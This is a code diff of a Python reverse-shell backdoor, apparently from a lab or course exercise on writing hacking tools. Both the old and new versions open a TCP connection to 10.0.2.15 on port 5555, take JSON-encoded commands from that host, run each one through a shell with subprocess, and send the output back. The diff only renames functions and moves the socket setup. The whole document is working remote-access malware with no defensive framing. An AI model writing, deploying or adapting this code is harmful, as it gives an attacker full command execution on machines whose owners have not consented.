@@ -2,32 +2,30 @@ import socket
 import json
 import subprocess
 
-sock_target = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock_target.connect(("10.0.2.15", 5555))
-
-def Send(data):
+def reliable_send(data):
     jsondata = json.dumps(data)
-    sock_target.send(jsondata.encode())
+    s.send(jsondata.encode())
 
-
-def Recieve():
+def reliable_recieve():
     data = ''
     while True:
         try:
-            data = data + sock_target.recv(1024).decode().rstrip()
+            data = data + s.recv(1024).decode().rstrip()
             return json.loads(data)
         except ValueError:
             continue
 
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(("10.0.2.15", 5555))
+
 def shell():
     while True:
-        command = Recieve()
+        command = reliable_recieve()
         if command == "quit":
             break
-        exe = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
-        result = exe.stdout.read() + exe.stderr.read()
-        Send(result.decode())
-
-
+        execute = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stderr = subprocess.PIPE, stdin = subprocess.PIPE)
+        result = execute.stdout.read() + execute.stderr.read()
+        result = result.decode()
+        reliable_send(result)
 
 shell()
